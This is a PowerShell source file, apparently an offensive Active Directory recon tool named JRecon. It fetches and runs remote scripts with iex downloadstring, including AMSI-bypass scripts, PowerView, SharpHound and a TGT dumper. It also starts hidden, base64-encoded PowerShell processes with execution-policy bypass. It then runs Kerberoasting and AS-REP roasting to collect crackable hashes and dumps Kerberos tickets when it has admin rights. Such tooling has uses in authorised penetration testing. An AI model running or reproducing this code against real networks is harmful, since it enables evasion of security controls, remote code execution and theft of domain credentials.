function Invoke-JRecon{

    [CmdletBinding()] Param(

        [Parameter (Mandatory=$False, ValueFromPipeline=$true)]
        [String]
        $Domain,

        [Parameter (Mandatory=$False, ValueFromPipeline=$true)]
        [String]
        $Server,
        
        [Parameter (Mandatory=$False, ValueFromPipeline=$true)]
        [String]
        $Exclude,
        
        [Parameter (Mandatory=$False, ValueFromPipeline=$true)]
        [String]
        $ServerURL,
		
		[Parameter (Mandatory=$False, ValueFromPipeline=$true)]
        [String]
        $ToolsURL,
        
        [Parameter (Mandatory=$False, ValueFromPipeline=$true)]
        [String]
        $ToolOutput,
		
		[Parameter (Mandatory=$False, ValueFromPipeline=$true)]
        [String]
        $PingCastleURL,
		
		[Parameter (Mandatory=$False, ValueFromPipeline=$true)]
        [string]
        $SharesWritable,
		
		[Parameter (Mandatory=$False, ValueFromPipeline=$true)]
        [string]
        $URLAttackFileName,
        
        [Parameter (Mandatory=$False, ValueFromPipeline=$true)]
        [string]
        $SMBServerIP,
        
        [Parameter (Mandatory=$False, ValueFromPipeline=$true)]
        [Switch]
        $NoNessus,
        
        [Parameter (Mandatory=$False, ValueFromPipeline=$true)]
        [Switch]
        $NoTools,
        
        [Parameter (Mandatory=$False, ValueFromPipeline=$true)]
        [Switch]
        $NoKali,
        
        [Parameter (Mandatory=$False, ValueFromPipeline=$true)]
        [Switch]
        $NoPingCastle,
        
        [Parameter (Mandatory=$False, ValueFromPipeline=$true)]
        [Switch]
        $NoEnum,
        
        [Parameter (Mandatory=$False, ValueFromPipeline=$true)]
        [Switch]
        $NoBloodHound,
		
		[Parameter (Mandatory=$False, ValueFromPipeline=$true)]
        [Switch]
        $NoKerberoasting,
        
        [Parameter (Mandatory=$False, ValueFromPipeline=$true)]
        [Switch]
        $NoTGTs,
        
        [Parameter (Mandatory=$False, ValueFromPipeline=$true)]
        [Switch]
        $NoVulnCertTemplates,
        
        [Parameter (Mandatory=$False, ValueFromPipeline=$true)]
        [Switch]
        $NoVulnGPOs,
		
		[Parameter (Mandatory=$False, ValueFromPipeline=$true)]
        [Switch]
        $NoExploitableSystems,
        
        [Parameter (Mandatory=$False, ValueFromPipeline=$true)]
        [Switch]
        $NoLDAPS,
		
		[Parameter (Mandatory=$False, ValueFromPipeline=$true)]
        [Switch]
        $NoLAPS,
        
        [Parameter (Mandatory=$False, ValueFromPipeline=$true)]
        [Switch]
        $NoGPOPass,
        
        [Parameter (Mandatory=$False, ValueFromPipeline=$true)]
        [Switch]
        $NoShares,
        
        [Parameter (Mandatory=$False, ValueFromPipeline=$true)]
        [Switch]
        $NoRWShares,
        
        [Parameter (Mandatory=$False, ValueFromPipeline=$true)]
        [Switch]
        $URLFileAttack,
		
		[Parameter (Mandatory=$False, ValueFromPipeline=$true)]
        [Switch]
        $URLFileClean,
        
        [Parameter (Mandatory=$False, ValueFromPipeline=$true)]
        [Switch]
        $NoSpool,
		
		[Parameter (Mandatory=$False, ValueFromPipeline=$true)]
        [Switch]
        $NoWebDAV,
        
        [Parameter (Mandatory=$False, ValueFromPipeline=$true)]
        [Switch]
        $WebDAVEnable,
		
		[Parameter (Mandatory=$False, ValueFromPipeline=$true)]
        [Switch]
        $WebDAVDisable,
        
        [Parameter (Mandatory=$False, ValueFromPipeline=$true)]
        [Switch]
        $NoSMBSigning,
		
		[Parameter (Mandatory=$False, ValueFromPipeline=$true)]
        [Switch]
        $OnlyPingCastle,
        
        [Parameter (Mandatory=$False, ValueFromPipeline=$true)]
        [Switch]
        $OnlyEnum,
		
		[Parameter (Mandatory=$False, ValueFromPipeline=$true)]
        [Switch]
        $OnlyBloodHound,
		
		[Parameter (Mandatory=$False, ValueFromPipeline=$true)]
        [Switch]
        $OnlyKerberoasting,
        
        [Parameter (Mandatory=$False, ValueFromPipeline=$true)]
        [Switch]
        $OnlyTGTs,
		
		[Parameter (Mandatory=$False, ValueFromPipeline=$true)]
        [Switch]
        $OnlyVulnCertTemplates,
        
        [Parameter (Mandatory=$False, ValueFromPipeline=$true)]
        [Switch]
        $OnlyVulnGPOs,
		
		[Parameter (Mandatory=$False, ValueFromPipeline=$true)]
        [Switch]
        $OnlyExploitableSystems,
        
        [Parameter (Mandatory=$False, ValueFromPipeline=$true)]
        [Switch]
        $OnlyLDAPS,
		
		[Parameter (Mandatory=$False, ValueFromPipeline=$true)]
        [Switch]
        $OnlyLAPS,
        
        [Parameter (Mandatory=$False, ValueFromPipeline=$true)]
        [Switch]
        $OnlyGPOPass,
        
        [Parameter (Mandatory=$False, ValueFromPipeline=$true)]
        [Switch]
        $OnlyShares,
        
        [Parameter (Mandatory=$False, ValueFromPipeline=$true)]
        [Switch]
        $OnlyRWShares,
		
		[Parameter (Mandatory=$False, ValueFromPipeline=$true)]
        [Switch]
        $OnlyURLFileAttack,
		
		[Parameter (Mandatory=$False, ValueFromPipeline=$true)]
        [Switch]
        $OnlyURLFileClean,
        
        [Parameter (Mandatory=$False, ValueFromPipeline=$true)]
        [Switch]
        $OnlySpool,
		
		[Parameter (Mandatory=$False, ValueFromPipeline=$true)]
        [Switch]
        $OnlyWebDAV,
        
        [Parameter (Mandatory=$False, ValueFromPipeline=$true)]
        [Switch]
        $OnlyWebDAVEnable,
        
        [Parameter (Mandatory=$False, ValueFromPipeline=$true)]
        [Switch]
        $OnlyWebDAVDisable,
        
        [Parameter (Mandatory=$False, ValueFromPipeline=$true)]
        [Switch]
        $OnlySMBSigning

    )
	
	clear
	$tempdirectory = $pwd
	$ErrorActionPreference = "SilentlyContinue"
    	$WarningPreference = "SilentlyContinue"
	
	if($ServerURL){$ServerURL = $ServerURL.TrimEnd('/')}
	else{$ServerURL = "https://raw.githubusercontent.com/Leo4j/JRecon/main/Tools"}
	
	if($ToolsURL){$ToolsURL = $ToolsURL.TrimEnd('/')}
	else{$ToolsURL = "https://github.com/Leo4j/JRecon/raw/main/Tools"}
	
	iex(new-object net.webclient).downloadstring("$ServerURL/SimpleAMSI.ps1")

	iex(new-object net.webclient).downloadstring("$ServerURL/PowerView.ps1")

	Set-Variable MaximumHistoryCount 32767
	
	Write-Host "  ___                 _                  _ ____                      " -ForegroundColor Red;
	Write-Host " |_ _|_ ____   _____ | | _____          | |  _ \ ___  ___ ___  _ __  " -ForegroundColor Red;
	Write-Host "  | || '_ \ \ / / _ \| |/ / _ \_____ _  | | |_) / _ \/ __/ _ \| '_ \ " -ForegroundColor Red;
	Write-Host "  | || | | \ V / (_) |   <  __/_____| |_| |  _ <  __/ (_| (_) | | | |" -ForegroundColor Red;
	Write-Host " |___|_| |_|\_/ \___/|_|\_\___|      \___/|_| \_\___|\___\___/|_| |_|" -ForegroundColor Red;
    	Write-Host ""
	
	if($Domain){
		
		$currentDomain = $Domain
		
		if($Server){}
		else{
			$Server = Get-DomainController -Domain $Domain | Where-Object {$_.Roles -like "RidRole"} | Select-Object -ExpandProperty Name
			if($Server){}
			else{$Server = Read-Host "Enter the DC FQDN"}
		}
	}
	
	else{
		
		try{
  			$currentDomain = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
			$currentDomain = $currentDomain.Name
  		}
    	
		catch{$currentDomain = Get-WmiObject -Namespace root\cimv2 -Class Win32_ComputerSystem | Select Domain | Format-Table -HideTableHeaders | out-string | ForEach-Object { $_.Trim() }}
		
	}
	
	Write-Host "[+] Current domain is: $currentDomain" -ForegroundColor Green;
	
	if(!$Domain){
		# All Domains
		$ParentDomain = (Get-NetDomain | Select-Object -ExpandProperty Forest | Select-Object -ExpandProperty Name)
		$ChildDomains = (Get-NetDomain -Domain $ParentDomain | Select-Object -ExpandProperty Children | Select-Object -ExpandProperty Name)
		
		if($ChildDomains){
			$AllDomains = $ParentDomain + "`n"
			foreach($ChildDomain in $ChildDomains){
				$AllDomains += $ChildDomain + "`n"
			}
			$AllDomains = ($AllDomains | Out-String) -split "`n"
			$AllDomains = $AllDomains.Trim()
			$AllDomains = $AllDomains | Where-Object { $_ -ne "" }
		}

		else{
			$AllDomains = $ParentDomain + "`n"
			$AllDomains = ($AllDomains | Out-String) -split "`n"
			$AllDomains = $AllDomains.Trim()
			$AllDomains = $AllDomains | Where-Object { $_ -ne "" }
		}
		
		# Trust Domains (save to variable)
		
		if($Domain -AND $Server) {
			$TrustTargetNames = (Get-DomainTrust -Domain $Domain -Server $Server).TargetName
			$TrustTargetNames = ($TrustTargetNames | Out-String) -split "`n"
			$TrustTargetNames = $TrustTargetNames.Trim()
			$TrustTargetNames = $TrustTargetNames | Where-Object { $_ -ne "" }
			$TrustTargetNames = $TrustTargetNames | Sort-Object -Unique
			$TrustTargetNames = $TrustTargetNames | Where-Object { $_ -notin $Domain }
		}
		
		else{
			$TrustTargetNames = foreach($AllDomain in $AllDomains){(Get-DomainTrust -Domain $AllDomain).TargetName}
			$TrustTargetNames = ($TrustTargetNames | Out-String) -split "`n"
			$TrustTargetNames = $TrustTargetNames.Trim()
			$TrustTargetNames = $TrustTargetNames | Where-Object { $_ -ne "" }
			$TrustTargetNames = $TrustTargetNames | Sort-Object -Unique
			$TrustTargetNames = $TrustTargetNames | Where-Object { $_ -notin $AllDomains }
		}
		
		# Remove Outbound Trust from $AllDomains
		
		if($Domain -AND $Server) {
			$OutboundTrusts = Get-DomainTrust -Domain $Domain | Where-Object { $_.TrustDirection -eq 'Outbound' } | Select-Object -ExpandProperty TargetName
		}
		
		else{
			$OutboundTrusts = foreach($AllDomain in $AllDomains){Get-DomainTrust -Domain $AllDomain | Where-Object { $_.TrustDirection -eq 'Outbound' } | Select-Object -ExpandProperty TargetName}
		}
		
		$AllDomains = $AllDomains + "`n"
		
		foreach($TrustTargetName in $TrustTargetNames){
			$AllDomains += $TrustTargetName + "`n"
		}
		
		$AllDomains = ($AllDomains | Out-String) -split "`n"
		$AllDomains = $AllDomains.Trim()
		$AllDomains = $AllDomains | Where-Object { $_ -ne "" }
		$AllDomains = $AllDomains | Sort-Object -Unique
		
		#$AllDomains += $TrustTargetNames
		$PlaceHolderDomains = $AllDomains
		$AllDomains = $AllDomains | Where-Object { $_ -notin $OutboundTrusts }
		
		if($Exclude){
			$ExcludeDomains = $Exclude -split ','
			$AllDomains = $AllDomains | Where-Object { $_ -notin $ExcludeDomains }
		}
		
	}
	
	if($ToolOutput){$ToolOutput = $ToolOutput.TrimEnd('\')}
	else{$ToolOutput = "c:\Users\Public\Documents"}
	
	cd $ToolOutput
	
	if($Domain){
		if(Test-Path -Path "$ToolOutput\$Domain\"){}
		else{New-Item -Path "$ToolOutput\$Domain\" -ItemType Directory | Out-Null}
	}
	
	else{
		foreach($AllDomain in $AllDomains){
			if(Test-Path -Path "$ToolOutput\$AllDomain\"){}
			else{New-Item -Path "$ToolOutput\$AllDomain\" -ItemType Directory | Out-Null}
		}
	}
	
	if($NoNessus -and $NoTools -and $NoKali){}
	else{
		if(Test-Path -Path $ToolOutput\Tools\){}
		else{New-Item -Path $ToolOutput\Tools\ -ItemType Directory | Out-Null}
	}
	
	if($NoNessus){}
	else{
		if(Test-Path -Path $ToolOutput\Tools\Nessus.msi){}
		else{

			$ScriptBlockContent = "
			
			`$ServerURL = `"$ServerURL`"
			`$ToolOutput = `"$ToolOutput`"

			`$jobs = 1..10 | ForEach-Object {
				Start-Job -ScriptBlock {
					param(`$ServerURL, `$ToolOutput, `$i)
					Invoke-WebRequest -Uri `"`$ServerURL/NessusChunk`$i.txt`" -OutFile `"`$ToolOutput\Tools\NessusChunk`$i.txt`" -UseBasicParsing
				} -ArgumentList `$ServerURL, `$ToolOutput, `$_
			}

			Wait-Job -Job `$jobs

			`$combinedContent = `''
			1..10 | ForEach-Object {
				`$content = Get-Content -Path `"`$ToolOutput\Tools\NessusChunk`$_.txt`" -Raw
				`$content = `$content.Trim()
				`$combinedContent += `$content
			}
			Set-Content -Path `"`$ToolOutput\Tools\Nessus.txt`" -Value `$combinedContent

			Remove-Item `"`$ToolOutput\Tools\NessusChunk*.txt`"

			`$base64Content = Get-Content -Raw -Path `"`$ToolOutput\Tools\Nessus.txt`"
			`$decodedBytes = [System.Convert]::FromBase64String(`$base64Content)
			[System.IO.File]::WriteAllBytes(`"`$ToolOutput\Tools\Nessus.msi`", `$decodedBytes)

			Remove-Item `"`$ToolOutput\Tools\Nessus.txt`"
			"

			$bytes = [System.Text.Encoding]::Unicode.GetBytes($ScriptBlockContent)
			$encodedCommand = [Convert]::ToBase64String($bytes)

			Start-Process PowerShell -ArgumentList "-NoProfile -ExecutionPolicy Bypass -EncodedCommand $encodedCommand" -WindowStyle Hidden
		}
	}
	
	if($NoTools){}
	else{
		if(Test-Path -Path $ToolOutput\Tools\hfs.exe){}
		else{Start-Process -WindowStyle Hidden powershell -ArgumentList "-NoProfile -Command & {Invoke-WebRequest -Uri $($ToolsURL)/hfs.exe -OutFile $($ToolOutput)\Tools\hfs.exe}"}
		if(Test-Path -Path $ToolOutput\Tools\WinShareEnum.exe){}
		else{Start-Process -WindowStyle Hidden powershell -ArgumentList "-NoProfile -Command & {Invoke-WebRequest -Uri $($ToolsURL)/WinShareEnum.exe -OutFile $($ToolOutput)\Tools\WinShareEnum.exe}"}
		if(Test-Path -Path $ToolOutput\Tools\Advanced_IP_Scanner.exe){}
		else{Start-Process -WindowStyle Hidden powershell -ArgumentList "-NoProfile -Command & {Invoke-WebRequest -Uri $($ToolsURL)/Advanced_IP_Scanner.exe -OutFile $($ToolOutput)\Tools\Advanced_IP_Scanner.exe}"}
		if(Test-Path -Path $ToolOutput\Tools\PsExec.exe){}
		else{Start-Process -WindowStyle Hidden powershell -ArgumentList "-NoProfile -Command & {Invoke-WebRequest -Uri $($ToolsURL)/PsExec64.exe -OutFile $($ToolOutput)\Tools\PsExec.exe}"}
	}
	
	if($NoKali){}
	else{
		if(Test-Path -Path $ToolOutput\Tools\7z.exe){}
		else{
			start powershell -WindowStyle Hidden -ArgumentList "-NoProfile -Command & {Invoke-WebRequest -Uri $($ServerURL)/7z2301-x64.exe -OutFile $($ToolOutput)\Tools\7z.exe}"
		}
		if(Test-Path -Path $ToolOutput\Tools\kali.7z){}
		else{Start-Process -WindowStyle Hidden powershell -ArgumentList "-NoProfile -Command & {Invoke-WebRequest -Uri 'https://cdimage.kali.org/kali-2023.3/kali-linux-2023.3-virtualbox-amd64.7z' -OutFile $($ToolOutput)\Tools\kali.7z}"
		} #### Edit output directory with variable
		if(Test-Path -Path $ToolOutput\Tools\VirtualBox.exe){}
		else{Start-Process -WindowStyle Hidden powershell -ArgumentList "-NoProfile -Command & {Invoke-WebRequest -Uri 'https://download.virtualbox.org/virtualbox/7.0.10/VirtualBox-7.0.10-158379-Win.exe' -OutFile $($ToolOutput)\Tools\VirtualBox.exe}"}
		if(Test-Path -Path $ToolOutput\Tools\VirtualBox_Extension_Pack.vbox-extpack){}
		else{Start-Process -WindowStyle Hidden powershell -ArgumentList "-NoProfile -Command & {Invoke-WebRequest -Uri 'https://download.virtualbox.org/virtualbox/7.0.10/Oracle_VM_VirtualBox_Extension_Pack-7.0.10.vbox-extpack' -OutFile $($ToolOutput)\Tools\VirtualBox_Extension_Pack.vbox-extpack}"}
		
	}
	
	if($NoPingCastle -OR $OnlyEnum -OR $OnlyBloodHound -OR $OnlyKerberoasting -OR $OnlyTGTs -OR $OnlyVulnCertTemplates -OR $OnlyVulnGPOs -OR $OnlyExploitableSystems -OR $OnlyLDAPS -OR $OnlyLAPS -OR $OnlyGPOPass -OR $OnlyShares -OR $OnlyRWShares -OR $OnlyURLFileAttack -OR $OnlyURLFileClean -OR $OnlySpool -OR $OnlyWebDAV -OR $OnlyWebDAVEnable -OR $OnlyWebDAVDisable -OR $OnlySMBSigning) {}
	
	else{
	
		if($PingCastleURL){
			$jpingdownload = $PingCastleURL
		}
		
		else{
			$jpingdownload = "https://github.com/vletoux/pingcastle/releases/download/3.1.0.1/PingCastle_3.1.0.1.zip"
			Write-Host "JRecon will download and run PingCastle Free Edition, which is NOT FOR COMMERCIAL USE" -ForegroundColor Red
		
		}
		
		if(Test-Path -Path $ToolOutput\PingCastle\PingCastle.exe){}
		else{
		
			Invoke-WebRequest -Uri $jpingdownload -OutFile "$ToolOutput\PingCastle.zip"

			Add-Type -AssemblyName System.IO.Compression.FileSystem
			function Unzip
			{
				param([string]$zipfile, [string]$outpath)

				[System.IO.Compression.ZipFile]::ExtractToDirectory($zipfile, $outpath)
			}
			
			if(Test-Path -Path $ToolOutput\PingCastle\){}
			else{New-Item -Path $ToolOutput\PingCastle\ -ItemType Directory | Out-Null}

			Unzip "$ToolOutput\PingCastle.zip" "$ToolOutput\PingCastle\"
			del $ToolOutput\PingCastle.zip
		
		}
		
	}
	

	if ($NoEnum -OR $OnlyPingCastle -OR $OnlyBloodHound -OR $OnlyKerberoasting -OR $OnlyTGTs -OR $OnlyVulnCertTemplates -OR $OnlyVulnGPOs -OR $OnlyExploitableSystems -OR $OnlyLDAPS -OR $OnlyLAPS -OR $OnlyGPOPass -OR $OnlyShares -OR $OnlyRWShares -OR $OnlyURLFileAttack -OR $OnlyURLFileClean -OR $OnlySpool -OR $OnlyWebDAV -OR $OnlyWebDAVEnable -OR $OnlyWebDAVDisable -OR $OnlySMBSigning)
	{
		Write-Host "Skipping Initial Enumeration..." -ForegroundColor Yellow;
	}
	else{
		iex(new-object net.webclient).downloadstring("$ServerURL/ADRecon.ps1")
		
		if($Domain){
			cd $ToolOutput\$Domain
			Outvoke-ADRecon -DomainController (Get-DomainController -Domain $Domain | Where-Object { $_.Roles -like "*RidRole*" }).Name -OutputType html,csv -Collect Forest, Domain, Trusts, Sites, Subnets, SchemaHistory, PasswordPolicy, FineGrainedPasswordPolicy, DomainControllers, Users, UserSPNs, PasswordAttributes, Groups, GroupChanges, GroupMembers, OUs, ACLs, GPOs, gPLinks, GPOReport, DNSZones, DNSRecords, Printers, Computers, ComputerSPNs, LAPS, BitLocker, Kerberoast
			Import-csv $ToolOutput\$Domain\Recon_Report\CSV-Files\Users.csv -Delimiter ',' | Select Username, Description | where-object {$_.Description -ne ""} > $ToolOutput\$Domain\Description_field.txt
			Import-csv $ToolOutput\$Domain\Recon_Report\CSV-Files\Computers.csv -Delimiter ',' | Select-Object -ExpandProperty DNSHostName | Format-Table -HideTableHeaders > $ToolOutput\$Domain\Computers_list.txt
			mv $ToolOutput\$Domain\Computers_list.txt $ToolOutput\$Domain\Recon_Report\.
			Import-csv $ToolOutput\$Domain\Recon_Report\CSV-Files\Computers.csv -Delimiter ',' | Select Name, "IPv4Address", "Operating System" | where-object {$_."Operating System" -like "Windows Server*"} > $ToolOutput\$Domain\Servers.txt
			mv $ToolOutput\$Domain\Servers.txt $ToolOutput\$Domain\Recon_Report\.
			Import-csv $ToolOutput\$Domain\Recon_Report\CSV-Files\Computers.csv -Delimiter ',' | where-object {$_."Operating System" -like "Windows Server*"} | Select-Object -ExpandProperty DNSHostName | Format-Table -HideTableHeaders > $ToolOutput\$Domain\Servers_list.txt
			mv $ToolOutput\$Domain\Servers_list.txt $ToolOutput\$Domain\Recon_Report\.
			Import-csv $ToolOutput\$Domain\Recon_Report\CSV-Files\Computers.csv -Delimiter ',' | Select Name, "IPv4Address", "Operating System" | where-object {($_."Operating System" -like "Windows Me*") -or ($_."Operating System" -like "Windows NT*") -or ($_."Operating System" -like "Windows 95*") -or ($_."Operating System" -like "Windows 98*") -or ($_."Operating System" -like "Windows XP*") -or ($_."Operating System" -like "Windows 7*") -or ($_."Operating System" -like "Windows Vista*") -or ($_."Operating System" -like "Windows 2000*") -or ($_."Operating System" -like "Windows 8*") -or ($_."Operating System" -like "Windows Server 2008*") -or ($_."Operating System" -like "Windows Server 2003*") -or ($_."Operating System" -like "Windows Server 2000*")} > $ToolOutput\$Domain\Unsupported_OS.txt
			Write-Host "Done!" -ForegroundColor Green;
			Write-Output "`n"
		}
		
		else{
			
			Write-Host "Running enumeration for each domain..." -ForegroundColor Green;
			Write-Output "`n"
			
			foreach($AllDomain in $AllDomains){
				cd $ToolOutput\$AllDomain
				Outvoke-ADRecon -DomainController (Get-DomainController -Domain $AllDomain | Where-Object { $_.Roles -like "*RidRole*" }).Name -OutputType html,csv -Collect Forest, Domain, Trusts, Sites, Subnets, SchemaHistory, PasswordPolicy, FineGrainedPasswordPolicy, DomainControllers, Users, UserSPNs, PasswordAttributes, Groups, GroupChanges, GroupMembers, OUs, ACLs, GPOs, gPLinks, GPOReport, DNSZones, DNSRecords, Printers, Computers, ComputerSPNs, LAPS, BitLocker, Kerberoast
				Import-csv $ToolOutput\$AllDomain\Recon_Report\CSV-Files\Users.csv -Delimiter ',' | Select Username, Description | where-object {$_.Description -ne ""} > $ToolOutput\$AllDomain\Description_field.txt
				Import-csv $ToolOutput\$AllDomain\Recon_Report\CSV-Files\Computers.csv -Delimiter ',' | Select-Object -ExpandProperty DNSHostName | Format-Table -HideTableHeaders > $ToolOutput\$AllDomain\Computers_list.txt
				mv $ToolOutput\$AllDomain\Computers_list.txt $ToolOutput\$AllDomain\Recon_Report\.
				Import-csv $ToolOutput\$AllDomain\Recon_Report\CSV-Files\Computers.csv -Delimiter ',' | Select Name, "IPv4Address", "Operating System" | where-object {$_."Operating System" -like "Windows Server*"} > $ToolOutput\$AllDomain\Servers.txt
				mv $ToolOutput\$AllDomain\Servers.txt $ToolOutput\$AllDomain\Recon_Report\.
				Import-csv $ToolOutput\$AllDomain\Recon_Report\CSV-Files\Computers.csv -Delimiter ',' | where-object {$_."Operating System" -like "Windows Server*"} | Select-Object -ExpandProperty DNSHostName | Format-Table -HideTableHeaders > $ToolOutput\$AllDomain\Servers_list.txt
				mv $ToolOutput\$AllDomain\Servers_list.txt $ToolOutput\$AllDomain\Recon_Report\.
				Import-csv $ToolOutput\$AllDomain\Recon_Report\CSV-Files\Computers.csv -Delimiter ',' | Select Name, "IPv4Address", "Operating System" | where-object {($_."Operating System" -like "Windows Me*") -or ($_."Operating System" -like "Windows NT*") -or ($_."Operating System" -like "Windows 95*") -or ($_."Operating System" -like "Windows 98*") -or ($_."Operating System" -like "Windows XP*") -or ($_."Operating System" -like "Windows 7*") -or ($_."Operating System" -like "Windows Vista*") -or ($_."Operating System" -like "Windows 2000*") -or ($_."Operating System" -like "Windows 8*") -or ($_."Operating System" -like "Windows Server 2008*") -or ($_."Operating System" -like "Windows Server 2003*") -or ($_."Operating System" -like "Windows Server 2000*")} > $ToolOutput\$AllDomain\Unsupported_OS.txt
			}
			
			Write-Host "Done!" -ForegroundColor Green;
			Write-Output "`n"
		}
		
	}

	if($NoPingCastle -OR $OnlyEnum -OR $OnlyBloodHound -OR $OnlyKerberoasting -OR $OnlyTGTs -OR $OnlyVulnCertTemplates -OR $OnlyVulnGPOs -OR $OnlyExploitableSystems -OR $OnlyLDAPS -OR $OnlyLAPS -OR $OnlyGPOPass -OR $OnlyShares -OR $OnlyRWShares -OR $OnlyURLFileAttack -OR $OnlyURLFileClean -OR $OnlySpool -OR $OnlyWebDAV -OR $OnlyWebDAVEnable -OR $OnlyWebDAVDisable -OR $OnlySMBSigning) {
		Write-Host "Skipping PingCastle..." -ForegroundColor Yellow;
	}

	else{
		
		if($Domain){

			echo ""
			Write-Host "Running PingCastle..." -ForegroundColor Cyan;
			
			cd $ToolOutput\$Domain

			.$ToolOutput\PingCastle\PingCastle.exe --healthcheck --server $currentDomain
			
			Write-Host "Done!" -ForegroundColor Green;
			
			echo " "
			
		}
		
		else{
			
			echo ""
			Write-Host "Running PingCastle for each domain..." -ForegroundColor Cyan;
			
			foreach($AllDomain in $AllDomains){
				
				cd $ToolOutput\$AllDomain
				
				.$ToolOutput\PingCastle\PingCastle.exe --healthcheck --server $AllDomain
				
			}
			
			Write-Host "Done!" -ForegroundColor Green;
			
			echo " "
			
		}

		del $ToolOutput\*.xml
		
		cd $ToolOutput
	}
	
	
	iex(new-object net.webclient).downloadstring("$ServerURL/NETAMSI.ps1") > $null
	
	
	if ($NoBloodHound -OR $OnlyPingCastle -OR $OnlyEnum -OR $OnlyKerberoasting -OR $OnlyTGTs -OR $OnlyVulnCertTemplates -OR $OnlyVulnGPOs -OR $OnlyExploitableSystems -OR $OnlyLDAPS -OR $OnlyLAPS -OR $OnlyGPOPass -OR $OnlyShares -OR $OnlyRWShares -OR $OnlyURLFileAttack -OR $OnlyURLFileClean -OR $OnlySpool -OR $OnlyWebDAV -OR $OnlyWebDAVEnable -OR $OnlyWebDAVDisable -OR $OnlySMBSigning)
	{
		Write-Host "Skipping BloodHound collection..." -ForegroundColor Yellow;
	}
	else{
		iex(new-object net.webclient).downloadstring("$ServerURL/SharpHound.ps1")
		if($Domain){
			echo ""
			Write-Host "Running BloodHound Collector... " -ForegroundColor Cyan
			Invoke-BloodHound -CollectionMethods All -OutputDirectory $ToolOutput\$Domain\. -Domain $Domain
			del $ToolOutput\$Domain\*.bin
			Write-Host "Done! " -ForegroundColor Green;
			echo " "
		}
		
		else{
			echo ""
			Write-Host "Running BloodHound Collector for all domains... " -ForegroundColor Cyan
			foreach($AllDomain in $AllDomains){
				Invoke-BloodHound -CollectionMethods All -OutputDirectory $ToolOutput\$AllDomain\. -Domain $AllDomain
				del $ToolOutput\$AllDomain\*.bin
			}
		}
	}
	

	if($NoKerberoasting -OR $OnlyPingCastle -OR $OnlyEnum -OR $OnlyBloodHound -OR $OnlyTGTs -OR $OnlyVulnCertTemplates -OR $OnlyVulnGPOs -OR $OnlyExploitableSystems -OR $OnlyLDAPS -OR $OnlyLAPS -OR $OnlyGPOPass -OR $OnlyShares -OR $OnlyRWShares -OR $OnlyURLFileAttack -OR $OnlyURLFileClean -OR $OnlySpool -OR $OnlyWebDAV -OR $OnlyWebDAVEnable -OR $OnlyWebDAVDisable -OR $OnlySMBSigning) {Write-Host "Skipping Kerberoasting..." -ForegroundColor Yellow;}
	else{
		iex(new-object net.webclient).downloadstring("$ServerURL/Invoke-Kerberoast.ps1")
		if ($Domain){
			echo ""
			Write-Host "Kerberoasting... " -ForegroundColor Cyan;
			Invoke-Kerberoast -erroraction silentlycontinue -domain $Domain -OutputFormat Hashcat|Select-Object -ExpandProperty hash | out-file -Encoding ASCII $ToolOutput\$Domain\$Domain-kerb-hashes.txt

			type $ToolOutput\$Domain\$Domain-kerb-hashes.txt
			Write-Host "Done! " -ForegroundColor Green;
			echo " "
		}
		else{
			echo ""
			Write-Host "Kerberoasting... " -ForegroundColor Cyan;
			foreach($AllDomain in $AllDomains){
				Invoke-Kerberoast -erroraction silentlycontinue -domain $AllDomain -OutputFormat Hashcat|Select-Object -ExpandProperty hash | out-file -Encoding ASCII $ToolOutput\$AllDomain\$AllDomain-kerb-hashes.txt
				type $ToolOutput\$AllDomain\$AllDomain-kerb-hashes.txt
			}
			Write-Host "Done! " -ForegroundColor Green;
			echo " "
		}
	}

	#ASREPRoasting with powerview ?

	if($NoKerberoasting -OR $OnlyPingCastle -OR $OnlyEnum -OR $OnlyBloodHound -OR $OnlyTGTs -OR $OnlyVulnCertTemplates -OR $OnlyVulnGPOs -OR $OnlyExploitableSystems -OR $OnlyLDAPS -OR $OnlyLAPS -OR $OnlyGPOPass -OR $OnlyShares -OR $OnlyRWShares -OR $OnlyURLFileAttack -OR $OnlyURLFileClean -OR $OnlySpool -OR $OnlyWebDAV -OR $OnlyWebDAVEnable -OR $OnlyWebDAVDisable -OR $OnlySMBSigning) {Write-Host "Skipping ASREPRoasting..." -ForegroundColor Yellow;}
	else{
		echo " "
		Write-Host "ASREPRoasting..." -ForegroundColor Cyan;
		iex(new-object net.webclient).downloadstring("$ServerURL/ASREPRoast.ps1")
		if ($Domain){
			Invoke-ASREPRoast -erroraction silentlycontinue -domain $Domain |Select-Object -ExpandProperty hash | out-file -Encoding ASCII $ToolOutput\$Domain\$Domain-ASREP-hashes.txt
			type $ToolOutput\$Domain\$Domain-ASREP-hashes.txt
			Write-Host "Done! " -ForegroundColor Green;
			echo " "
		}
		else{
			foreach($AllDomain in $AllDomains){
				Invoke-ASREPRoast -erroraction silentlycontinue -domain $AllDomain |Select-Object -ExpandProperty hash | out-file -Encoding ASCII $ToolOutput\$AllDomain\$AllDomain-ASREP-hashes.txt
				type $ToolOutput\$AllDomain\$AllDomain-ASREP-hashes.txt
			}
			Write-Host "Done! " -ForegroundColor Green;
			echo " "
		}
	}
	

	if($NoTGTs -OR $OnlyPingCastle -OR $OnlyEnum -OR $OnlyBloodHound -OR $OnlyKerberoasting -OR $OnlyVulnCertTemplates -OR $OnlyVulnGPOs -OR $OnlyExploitableSystems -OR $OnlyLDAPS -OR $OnlyLAPS -OR $OnlyGPOPass -OR $OnlyShares -OR $OnlyRWShares -OR $OnlyURLFileAttack -OR $OnlyURLFileClean -OR $OnlySpool -OR $OnlyWebDAV -OR $OnlyWebDAVEnable -OR $OnlyWebDAVDisable -OR $OnlySMBSigning){}
	else{
		echo " "
		Write-Host "Checking for TGTs..." -ForegroundColor Cyan;
		$isAdmin = ([System.Security.Principal.WindowsPrincipal][System.Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([System.Security.Principal.WindowsBuiltInRole]::Administrator)
		if($isAdmin){
			iex(new-object net.webclient).downloadstring("$ServerURL/dumper.ps1")
			Invoke-TGTDump > $ToolOutput\Kerb-Tickets.txt
			type $ToolOutput\Kerb-Tickets.txt
			echo " "
			Write-Host "Done! " -ForegroundColor Green;
			echo " "
		}
		else{
			Write-Host "[-] Not running on an elevated context. Working with TGTs will fail." -ForegroundColor Red
			Write-Output ""
		}
	}



